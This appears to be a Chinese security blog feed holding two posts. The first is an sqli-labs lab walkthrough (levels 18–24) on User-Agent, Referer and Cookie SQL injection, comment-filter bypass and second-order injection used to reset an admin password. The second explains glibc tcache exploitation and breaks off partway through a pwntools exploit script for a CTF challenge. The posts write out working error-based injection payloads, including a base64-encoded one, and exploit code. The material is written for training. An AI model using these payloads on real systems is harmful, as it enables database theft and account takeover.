协议的详细内容请参考RFC2616。HTTP协议采用了请求&#x2F;响应模型。客户端向服务器发送一个请求，请求头包含请求的方法、URI、协议版本、以及包含请求修饰符、客户信息和内容的类似于MIME的消息结构。服务器以一个状态行作为响应，相应的内容包括消息协议的版本，成功或者错误编码加上包含服务器信息、实体元信息以及可能的实体内容。<br>通常HTTP消息包括客户机向服务器的请求消息和服务器向客户机的响应消息。这两种类型的消息由一个起始行，一个或者多个头域，一个只是头域结束的空行和可选的消息体组成。HTTP的头域包括通用头，请求头，响应头和实体头四个部分。每个头域由一个域名，冒号（:）和域值三部分组成。域名是大小写无关的，域值前可以添加任何数量的空格符，头域可以被扩展为多行，在每行开始处，使用至少一个空格或制表符。<br>有时候，后台开发人员为了验证客户端HTTP Header（比如常用的Cookie验证等)或者通过HTTP Header头信息获取客户端的一些信息(比如 User-Agent.Accept字段等),会对客户端HTTP Header进行获取并使用SQL语句进行处理，如果此时没有足够的安全考虑，就可能导致基于HTTP Header的注入漏洞。常见的HTTP Header注入类型包括Cookie注入、Referer注入、User-Agent注入、XFF注入等。这里我们讲其中的<em><strong>Cookie注入、Referer注入、User-Agent注入</strong></em></p><h2 id="sqli-labs-less-18"><a href="#sqli-labs-less-18" class="headerlink" title="sqli-labs less-18"></a>sqli-labs less-18</h2><h3 id="新的考点"><a href="#新的考点" class="headerlink" title="新的考点"></a>新的考点</h3><hr><p>这题和之前的关卡都不一样，不管输入什么都没有任何回显，这是因为用户名与密码的获取方式是post,而且采用了check_input处理，所以在这两个地方注入不行,源码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是题目在登入后，回显了我们的IP地址和我们的User Agent，我们猜测注入点在此。<br><img src="/images/bp%E5%88%9D%E4%BD%93%E9%AA%8Csqli-18/1.png"></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uagent</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>这个就是获取我们User Agent的函数……<span class="token variable">$insert</span><span class="token operator">=</span><span class="token string double-quoted-string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('<span class="token interpolation"><span class="token variable">$uagent</span></span>', '<span class="token interpolation"><span class="token variable">$IP</span></span>', <span class="token interpolation"><span class="token variable">$uname</span></span>)"</span><span class="token punctuation">;</span><span class="token comment">#这是负责插入uagent的地方</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>insert……values……看这篇<a href="https://www.w3school.com.cn/sql/sql_insert.asp">文章</a></p><h2 id="bp抓包初体验"><a href="#bp抓包初体验" class="headerlink" title="bp抓包初体验"></a>bp抓包初体验</h2><hr><p>我们先抓取登录时的包：<br><img src="/images/bp%E5%88%9D%E4%BD%93%E9%AA%8Csqli-18/2.png"><br>我们将User Agent的值给改了，改成我们的报错注入语句<code>&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#39; ，再放包就可以看到报错出我们想要的信息了，**注：这里再updatexml前面用or，如果用and虽然不会出现注入错误，但是不知道为什么改了其他语句后我们的报错回显不出来，但是用or就行，有待考究** ![](/images/bp初体验sqli-18/3.png) 这里网上有些说注释-- q、-+、#用不了，不是这个原因，这里是因为原来要传入&#39;$uagent&#39;, &#39;$IP&#39;, $uname三个值，如果提前在，‘1,1）’前注释了后面两个值就没了，和insert……values……函数格式不符，因此不能回显，我们加上or&#39;将后面一个参数的第一个&#39;给闭合了，这样就形成了在&#39;$uagent&#39;与 &#39;$IP&#39;之间插入了我们要的注入语句相当于</code>‘$uagent’ and updatexml(1,concat(0x7e,(select database()),0x7e),1) or’$IP’, $uname&#96;，别将后面的两个参数给注释了，剩下的就是更换语句就不列举了</p><h2 id="sqli-labs-less-19"><a href="#sqli-labs-less-19" class="headerlink" title="sqli-labs less-19"></a>sqli-labs less-19</h2><hr><p>第19关和第18关一样，只是注入点变成了reference，换一个注入点即可，不多说</p><h2 id="cookie注入：less-20-22"><a href="#cookie注入：less-20-22" class="headerlink" title="cookie注入：less-20~22"></a>cookie注入：less-20~22</h2><hr><h3 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h3><p>cookie注入原理看这篇<a href="https://blog.csdn.net/k1k5cn/article/details/109581308">文章</a><br>先登入：<br><img src="/images/bp%E5%88%9D%E4%BD%93%E9%AA%8Csqli-18/4.png"><br>我们先看源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>……<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$cookee</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>……<span class="token keyword">echo</span> <span class="token string double-quoted-string">"YOUR COOKIE : uname = <span class="token interpolation"><span class="token variable">$cookee</span></span> and expires: "</span> <span class="token operator">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token variable">$format</span><span class="token punctuation">,</span> <span class="token variable">$timestamp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面三句话可以看到这里uname就是用cookie进行传参，并且打印cookie，我们只要在第二句话将我们的报错注入语句加入进去，就可以在进行这句话时爆出我们想要的信息<br>试出闭合：<br><code>admin&#39;</code>发现会报错，加入<code>admin&#39; -- q</code>正常回显却确定单引号闭合<br>这里我只查库名<code>admin&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1)-- q</code><br><img src="/images/bp%E5%88%9D%E4%BD%93%E9%AA%8Csqli-18/5.png"><br>可以看到爆出来了，接下来改改语句即可</p><h3 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h3><p><img src="/images/bp%E5%88%9D%E4%BD%93%E9%AA%8Csqli-18/6.png"><br>第21关稍有不同，他的cookie进行了base64加密，源码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">cookee <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$cookee</span><span class="token punctuation">)</span><span class="token punctuation">;</span>……<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username=('<span class="token interpolation"><span class="token variable">$cookee</span></span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们只需在网上找到base64的编码器将我们的语句进行编码，再向20题那样放入就行，试错和上面的方法是一样的结果为 ‘) 闭合<br>例如<code>admin&#39;) or updatexml(1,concat(0x7e,(select database()),0x7e),1)-- q</code>的编码是<code>YWRtaW4nKSBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpLS0gcQ==</code><br><img src="/images/bp%E5%88%9D%E4%BD%93%E9%AA%8Csqli-18/7.png"></p><h3 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h3><p>和less-21几乎一样只是闭合换成了 “</p><h1 id="sqli-labs-less-23"><a href="#sqli-labs-less-23" class="headerlink" title="sqli-labs less-23"></a>sqli-labs less-23</h1><hr><p>进来后界面很熟悉，先输入一个?id&#x3D;1<br><img src="/images/%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B0%E6%96%B9%E6%B3%95less-23/1.png"><br>输入<code>?id=1&#39;</code>发现报错，于是我们输入<code>?id=1&#39; and 1=1 -- q</code>报错<code>?id=1&#39; and 1=1 #</code>报错<code>?id=1&#39; and 1=1 --+</code>报错<br>这里展示源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//filter the comments out so as to comments should not work</span><span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/#/"</span><span class="token punctuation">;</span><span class="token variable">$reg1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/--/"</span><span class="token punctuation">;</span><span class="token variable">$replace</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg1</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对注释符进行了过滤，使它无法起作用<br>这里我们就要用其他方法绕过：<br><code>?id=1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1</code>将原来的两个单引号分别闭合，相当于之间插入了一段我们的注入语句，成功绕过<br>这里要讲：order by这里不能查看列数只能通过上面的来查看，发现到4时会报错：<br><img src="/images/%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B0%E6%96%B9%E6%B3%95less-23/2.png"><br>这个意思是这个函数返回了空<br>剩下的语句和以前一样，不多赘述</p><h1 id="sqli-labs-less-24"><a href="#sqli-labs-less-24" class="headerlink" title="sqli-labs less-24"></a>sqli-labs less-24</h1><h2 id="二次注入原理"><a href="#二次注入原理" class="headerlink" title="二次注入原理"></a>二次注入原理</h2><hr><ul><li>定义：二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</li><li>原理：在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在后端代码中可能会被转义，但在存入数据库时还是原来的数据，数据中一般带有单引号和＃号，然后下次使用在拼凑SQL中，所以就形成了二次注入。</li></ul><h2 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h2><p>先看它的登入源码(截取有效部分)：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">sqllogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mysql_real_escape_string函数对下列字符受影响：</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a<br>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。<br>也就是会对传入的username和password进行转码，使它注入无效，但在存入数据库时还是原来的数据<br>再看改密码源码：<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment"># Validating the user input........</span><span class="token variable">$username</span><span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$curr_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'current_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>发现只有username没被转义，得这里可以被利用，这题的主要思路就是获得管理员账号，这样就可以查看其他用户的信息。管理员账号一般是admin。<br>在登入页面我们注册一个账号：admin’#并登入进去<br>为什么？看源码：<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>我们注入完登入后就变成了”UPDATE users SET PASSWORD&#x3D;’$pass’ where username&#x3D;’admin’# and password&#x3D;’$curr_pass’ “;<br>后面被注释了，相当于对admin账号的密码进行修改，再次用admin账号和密</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web靶场攻略 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache机制讲解和利用</title>
      <link href="/2023/03/21/Tcache%E6%9C%BA%E5%88%B6%E8%AE%B2%E8%A7%A3%E5%92%8C%E5%88%A9%E7%94%A8/"/>
      <url>/2023/03/21/Tcache%E6%9C%BA%E5%88%B6%E8%AE%B2%E8%A7%A3%E5%92%8C%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Tcache机制讲解和利用"><a href="#Tcache机制讲解和利用" class="headerlink" title="Tcache机制讲解和利用"></a>Tcache机制讲解和利用</h1><hr><p>必须要进入更高级的glibc版本学了，<del>题目打不下去了</del></p><hr><p>本文转载于这篇<a href="https://fish-o0o.github.io/2019/09/14/Tcache%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/">文章</a><br>作者：Fish_o0O</p><hr><p>Tcache机制是在libc-2.26中引入的一个新的堆管理机制，是在Ubuntu 17.04后引进的一种技术，但这种技术为了提高效率的同时也带来了很多的安全隐患。</p><h3 id="0x01-Tcachebin源码分析："><a href="#0x01-Tcachebin源码分析：" class="headerlink" title="0x01 Tcachebin源码分析："></a>0x01 Tcachebin源码分析：</h3><hr><p>我们先来看看Tcache的两个结构体：</p><h5 id="tcache-perthread-struct："><a href="#tcache-perthread-struct：" class="headerlink" title="tcache_perthread_struct："></a>tcache_perthread_struct：</h5><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TCACHE_MAX_BINS</span> <span class="token expression"><span class="token number">64</span></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">tcache_perthread_struct</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> counts<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>    tcache_entry <span class="token operator">*</span>entries<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>tcache_perthread_struct<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h5><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">tcache_entry</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">tcache_entry</span> <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>tcache_entry<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>从源码看来，tcache_perthread_struct在Tcache机制中起管理作用，通常情况下，sizeof（tcache_perthread_struct）&#x3D;&#x3D; 0x240,也就是可以对<strong>低于0x400</strong>大小的堆块进行管理（下面有解释），tcache_perthread_struct.count[i]在64bit系统中对应大小为8*i的堆块的tcachebin数量，i最大为7，<strong>也就是Tcachebins最多能存储8个堆</strong>tcache_pthread_struct.tcache_entry[i]则指向该大小对应的第一个Tcachebin的<strong>fd</strong>的位置</p><h5 id="free"><a href="#free" class="headerlink" title="free"></a>free</h5><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">tcache_put</span><span class="token punctuation">(</span>mchunkptr chunk <span class="token punctuation">,</span> <span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">chunk2mem</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">assert</span><span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>    e<span class="token operator">-></span>next <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>    tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>    <span class="token operator">++</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Tcache机制和前几个版本不一样的是，刚开始free掉的堆块不是直接进入fastbin、unsortbin等bins里，它是先进入Tcachebins里，等Tcachebins填满了8个堆块再进入其他bins里，在放入Tcachebin时会调用tcache_put函数,其代码如上。<br>总的来说，就是将free的堆块插入Tcachebin的前端，将fd指向前一个堆块，并将对应的tcache_entry指向当前堆块，再将count+1。</p><h5 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h5><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">tcache_get</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">assert</span><span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">assert</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>e<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若对应大小的Tcachebin为空，则会从对应大小的bin中去寻找(寻找顺序同之前版本)。在这种情况下，即Tcachebin未满时，却从Fastbin&#x2F;Smallbin中取出堆块，则会将链上的其他堆块都链入Tcachebin中。其具体算法是首先判断该大小对应的Tcachebin是否未满,若未满则将并将Fastbin&#x2F;Smallbin中取出的堆块指针进行保存，其之后的堆块按照Fastbin&#x2F;Smallbin的分配顺序将堆块链入Tcachebin中，直到对应大小的Tcachebin放满或Fastbin&#x2F;Smallbin的链为空，最后将之前取出的堆块指针返回给用户使用。由于是按照Fastbin&#x2F;Smallbin的分配顺序将堆块放入Tcachebin中，因此不难判断，最从Tcachebin中申请的堆块顺序是与正常从Fastbin&#x2F;Smallbin中申请堆块顺序时反向的。</p><h3 id="0x02-举个栗子："><a href="#0x02-举个栗子：" class="headerlink" title="0x02 举个栗子："></a>0x02 举个栗子：</h3><hr><p>如图：我申请两个0x10和一个0x20的堆块，并把它们free掉<br><img src="/images/Tcache%E6%9C%BA%E5%88%B6%E8%AE%B2%E8%A7%A3%E5%92%8C%E5%88%A9%E7%94%A8/1.png"><br><img src="/images/Tcache%E6%9C%BA%E5%88%B6%E8%AE%B2%E8%A7%A3%E5%92%8C%E5%88%A9%E7%94%A8/2.png"><br>0x250的堆块是在第一次申请内存时，会分配的一个空间用于存放tcache_pthread_struct(0x240+堆头&#x3D;0x250）<br>图中<strong>红色方框</strong>内的数据，即对应结构体中的count，共<strong>0x40</strong>字节，每字节对应相应大小Tcachebin中的个数。如<strong>蓝色方框</strong>中对应size为<strong>0x20</strong>大小的Tcachebin中有<strong>2</strong>个空闲堆块，而<strong>绿色方框</strong>中则对应size为<strong>0x30</strong>大小的Tcachebin中有<strong>1</strong>个空闲堆块。<br>图中下面大方框内的数据，即对应结构体中的tcache_entry，<strong>共0x200字节</strong>(32行每行两个8位即2*32&#x3D;0x40，0x40 * 8 &#x3D;&#x3D; 0x200)，每一个指针对应相应大小Tcachebin中第一个堆块的入口地址。如绿色箭头对应size为0x20大小的Tcachebin的入口地址，二蓝色箭头则对应size为0x30大小的Tcachebin**的入口地址。</p><h3 id="0x03-Tcachebin和其他bins的异同点"><a href="#0x03-Tcachebin和其他bins的异同点" class="headerlink" title="0x03 Tcachebin和其他bins的异同点"></a>0x03 Tcachebin和其他bins的异同点</h3><hr><p>从宏观来看，Tcachebin的各项操作与Fastbin大同小异，如FILO(先进后出)的单循环链表、精确分配(不切割)、free后为防止合并<strong>后一个堆块的inuse位不置0</strong>等。<br>但在细节上仍存在些许差异，如Fastbin中fd是指向链表中下一个堆块的堆头，而<strong>Tcachebin中fd则是直接指向链表中下一个堆块的fd</strong>。除此之外，在从Tcachebin中申请回内存块时，<strong>并没有特定的代码去检验该内存块的大小是否与这条Tcachebin所管理的大小相吻合</strong>！<br>以上两点差异意味着在Tcachebin中利用类似Fastbin Attack的技巧时，<strong>不需要再去找到合适的地址伪造size位，不需要再去计算堆头到data区域的偏移</strong>，而是<strong>指哪儿打哪儿</strong>(fd伪造到哪里，之后写的就是哪里)。</p><h3 id="0x03-Tcache的利用姿势——pwn！"><a href="#0x03-Tcache的利用姿势——pwn！" class="headerlink" title="0x03 Tcache的利用姿势——pwn！"></a>0x03 Tcache的利用姿势——pwn！</h3><h5 id="Tcache-poisoning"><a href="#Tcache-poisoning" class="headerlink" title="Tcache poisoning"></a>Tcache poisoning</h5><ul><li>篡改Tcachebin中的fd字段，导致在申请被篡改堆块后的下一个堆块时能够申请到任意地址。与Fastbin相比，Tcachebin中为了得到更高的效率而舍去了安全性，在进行申请时没有对size位进行校验，而且由于Tcachebin中的fd是指向下一个堆块的fd(Fastbin的fd是指向下一个堆块的堆头)，因此指向的地址即是申请后写数据的地址，不再需要去考虑堆头的偏移。<strong>但是在glibc 2.29版本已经添加了size检查，因此只能实用与2.28版本之前。</strong></li></ul><h5 id="Tcache-perthread-corruption"><a href="#Tcache-perthread-corruption" class="headerlink" title="Tcache perthread corruption"></a>Tcache perthread corruption</h5><ul><li>在最开始介绍结构体时提到的tcache_perthread_struct结构体，该结构体size为0x250，是管理整个Tcachebin的结构体，如果对这个结构体有写权限，那么可以控制任意大小Tcachebin的入口地址。（这个还不知道如何利用后续会补充，原理先扔这了）</li></ul><h5 id="U2T"><a href="#U2T" class="headerlink" title="U2T"></a>U2T</h5><ul><li>U2T即Unsortbin 2 Tcachebin，主要是配合Off By One或Off By NULL的漏洞，使Unsortbin在合并过程中将中间的Tcachebin合并，从而达到修改fd字段的效果。(这个碰到题目会补充）</li></ul><h3 id="hitcon-2018-children-tcache-wp"><a href="#hitcon-2018-children-tcache-wp" class="headerlink" title="hitcon_2018_children_tcache wp"></a>hitcon_2018_children_tcache wp</h3><p>这是buuctf上的一题，感觉相当的头痛，因为我自己的做法还有好几个细节想不通，这里贴上网上大部分的做法解析，看这篇<a href="https://blog.csdn.net/m0_51251108/article/details/121169047">文章</a>和这篇<a href="https://www.cnblogs.com/luoleqi/p/13514092.html">文章</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29360</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">p</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Data:'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token 